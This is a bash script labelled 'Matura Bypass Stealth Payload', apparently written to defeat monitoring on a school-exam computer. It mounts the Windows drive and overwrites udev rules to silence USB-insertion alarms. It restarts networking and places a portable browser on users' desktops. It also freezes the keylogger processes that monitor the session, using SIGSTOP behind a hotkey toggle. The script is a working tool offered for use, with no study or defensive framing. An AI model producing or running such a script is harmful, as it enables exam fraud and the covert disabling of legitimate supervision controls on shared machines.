#!/bin/bash

# --- Matura Bypass Stealth Payload ---
# This script is designed to run in the background after the OS boots.

LOG_FILE="/tmp/bypass.log"
KEYLOGGER_PATTERN="keylog|logkeys|input-utils" # Common keylogger process names
MNT_POINT="/media/windows_c"
HOTKEY_FILE="/tmp/keylogger_paused"

echo "Initializing Matura Bypass..." > $LOG_FILE

# 1. Mount Windows C: Drive
mkdir -p $MNT_POINT
# Try to find the Windows partition (usually the largest NTFS partition)
WIN_PART=$(lsblk -pnlo NAME,FSTYPE,SIZE | grep -i "ntfs" | sort -hk3 | tail -n1 | awk '{print $1}')
if [ -n "$WIN_PART" ]; then
    mount -t ntfs-3g "$WIN_PART" $MNT_POINT -o ro || mount "$WIN_PART" $MNT_POINT -o ro
    echo "Windows partition $WIN_PART mounted at $MNT_POINT" >> $LOG_FILE
else
    echo "Windows partition not found." >> $LOG_FILE
fi

# 2. Neutralize Alarms (udev rules)
# We look for rules that might trigger on USB insertion
mkdir -p /etc/udev/rules.d/
echo 'ACTION=="add", SUBSYSTEM=="usb", RUN+="/bin/true"' > /etc/udev/rules.d/00-bypass-alarms.rules
udevadm control --reload-rules

# 3. Enable Networking
# Attempt to restart network manager if it exists
systemctl restart NetworkManager || /etc/init.d/networking restart
echo "Network services restarted." >> $LOG_FILE

# 3b. Setup Portable Browser (if present)
if [ -d "/opt/bypass/browser" ]; then
    # Create a link on the desktop if it's a standard path
    for user_home in /home/*; do
        if [ -d "$user_home/Desktop" ]; then
            ln -s /opt/bypass/browser/start-browser.sh "$user_home/Desktop/Browser"
            chown -h $(basename $user_home):$(basename $user_home) "$user_home/Desktop/Browser"
        fi
    done
fi

# 4. Keylogger Toggle Logic
# This function will be called by a background listener
toggle_keylogger() {
    if [ -f "$HOTKEY_FILE" ]; then
        # Resume
        PIDS=$(cat "$HOTKEY_FILE")
        kill -CONT $PIDS
        rm "$HOTKEY_FILE"
        echo "Keylogger RESUMED" >> $LOG_FILE
        # Visual feedback if possible (notify-send or similar)
        # DISPLAY=:0 notify-send "Bypass" "Keylogger RESUMED"
    else
        # Pause
        PIDS=$(pgrep -f -i "$KEYLOGGER_PATTERN")
        if [ -n "$PIDS" ]; then
            kill -STOP $PIDS
            echo "$PIDS" > "$HOTKEY_FILE"
            echo "Keylogger PAUSED" >> $LOG_FILE
            # DISPLAY=:0 notify-send "Bypass" "Keylogger PAUSED"
        fi
    fi
}

# 5. Start Hotkey Listener (C implementation)
if [ -f "/opt/bypass/hotkey_listener" ]; then
    /opt/bypass/hotkey_listener &
    echo "Hotkey listener started." >> $LOG_FILE
else
    echo "Error: hotkey_listener binary not found." >> $LOG_FILE
fi

echo "Payload initialized successfully." >> $LOG_FILE
